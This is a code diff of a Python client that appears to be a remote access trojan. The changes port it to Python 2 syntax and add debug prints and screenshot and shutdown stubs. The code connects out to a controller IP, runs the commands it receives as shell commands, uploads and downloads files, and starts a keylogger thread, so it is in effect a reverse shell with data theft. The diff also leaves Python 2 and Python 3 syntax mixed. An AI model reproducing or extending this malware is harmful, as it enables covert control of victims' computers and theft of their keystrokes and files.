@@ -1,10 +1,10 @@
-#!/usr/bin/python3
+#!/usr/bin/python
 import socket 
 import subprocess
 import threading
 import time
 import os
-import concurrent.futures
+# import concurrent.futures
 import platform
 
 
@@ -66,7 +66,10 @@ def run_shell():
 		try:
 			s = socket.socket()
 			s.settimeout(10)
+			print('connecting to', REMOTE_SERVER)
+			print('on port', PORT)
 			s.connect((REMOTE_SERVER, PORT))
+			print('connected to server')
 			s.settimeout(None)
 			print('connected to server.')
 			global REST_CONNECTION
@@ -78,10 +81,10 @@ def run_shell():
 					REST_CONNECTION = False
 					break
 				print('waiting for command')
-				command_bytes = (s.recv(1024))
-				command = command_bytes.decode("utf-8")
+				command_bytes = s.recv(1024)
+				command = command_bytes
 
-				print('Received: "' , command ,'"')
+				print 'Received: "' , command , '"'
 				if(command == ""):
 					break
 				elif command == "__0":
@@ -96,19 +99,28 @@ def run_shell():
 				elif command == "__down":
 					send_to_server(s)
 
+				elif command == "screenshot":
+					# TODO # take screenshot, save in a local folder and send it's path to server
+					pass
+				elif command == "shutdown":
+					# TODO # kill client process
+					pass
 
 				else:
+					print 'command:' , command
 					output = exec_command(command)
 
-				output_bytes = bytes(output, 'utf-8')
+				print 'output:' , output
+				output_bytes = bytes(output)
+				print 'output_bytes:' , output_bytes
 				try:
 					s.send(output_bytes)
 				except (socket.error):
 					print('Error Sending bytes:', socket.error)
 					break
 			s.close
-		except (socket.error):
-			print('Error somewhere else:', socket.error)
+		except (socket.error) as s_err:
+			print('Error somewhere else:', s_err)
 			s.close
 			time.sleep(3)
 		except (socket.gaierror):
@@ -118,18 +130,23 @@ def run_shell():
 	
 	
 def get_file(s):
-	s.send(bytes("OK",'utf-8'))
+	s.send(bytes("OK"))
 	print('Waiting for File destination...')
 	des = s.recv(512)
-	s.send(bytes("OK",'utf-8'))
+	s.send(bytes("OK"))
+	data = b''    
 	print('Waiting for File length...')
 	bs = s.recv(16)
-	s.send(bytes("OK",'utf-8'))
-	length = int(bs.decode('utf-8'))
+	try:
+		length = int(bs)
+		file = open(des, 'wb')
+		s.send(bytes("OK"))
+	except:
+		s.send(bytes("NOK"))
+		return
 	print('Length is {}. Waiting for File...'.format(bs))
-	data = b''
-	print('chunck is:', type(length))
-	file = open(des, 'wb')
+
+	print('data is:', type(length))
 	while len(data) < length:
 		to_read = length - len(data)
 		data += s.recv(
@@ -141,7 +158,7 @@ def get_file(s):
 
 
 def send_to_server(server):
-	server.send(bytes("OK",'utf-8'))
+	server.send(bytes("OK"))
 	# Get source path
 	print("sending to sever")
 	src = server.recv(1024)
@@ -153,7 +170,7 @@ def send_to_server(server):
 	print('checking file')
 	if(not os.path.isfile(src)):
 		print('File does not exist.')
-		server.send(bytes(str(length), 'utf-8'))
+		server.send(bytes(str(length)))
 		return
 	# open file 
 	file_bytes = ''
@@ -164,8 +181,12 @@ def send_to_server(server):
 		length = len(file_bytes)
 
 	print("Sending Length")
-	server.send(bytes(str(length), 'utf-8'))
-	server.recv(7)
+	server.send(bytes(str(length)))
+	status = server.recv(16)
+	print status
+	if(status.decode('utf-8') == "NOK"):
+		print 'server is not ready'
+		return
 	print("Sending File")
 	server.send(file_bytes)
 	print('File has been sent successfully.')
@@ -200,20 +221,27 @@ def get_single_local_broadcast():
 	message, address = s.recvfrom(10100)
 	print ("Got data from", address)
 	print ("Message is", message)
-	return message.decode('utf-8')
+	return message
 
 if __name__ == '__main__':
 	print('Running Client.py')
 	SYSTEM_INFO = collect_system_info()
-	# system_has_internet = check_internet()
-	system_has_internet = True
+	system_has_internet = check_internet()
+	# system_has_internet = True
 	if system_has_internet:
-		REMOTE_SERVER = '127.0.0.1'
+		REMOTE_SERVER = '192.168.56.1'
 	else:
 		REMOTE_SERVER = get_single_local_broadcast()
 	
 	print('Remote Server IP set to:' , REMOTE_SERVER)
-	with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
-		executor.submit(run_shell)
-		executor.submit(run_keylogger)
-		executor.submit(listen_to_local_broadcast)
+    
+	print 'Starting Threads'
+	t1 = threading.Thread(target=run_shell, args=())
+	t2 = threading.Thread(target=run_keylogger, args=())
+	t3 = threading.Thread(target=listen_to_local_broadcast, args=())
+
+	t1.start()
+	time.sleep(0.1)
+	t2.start()
+	time.sleep(0.2)
+	t3.start()
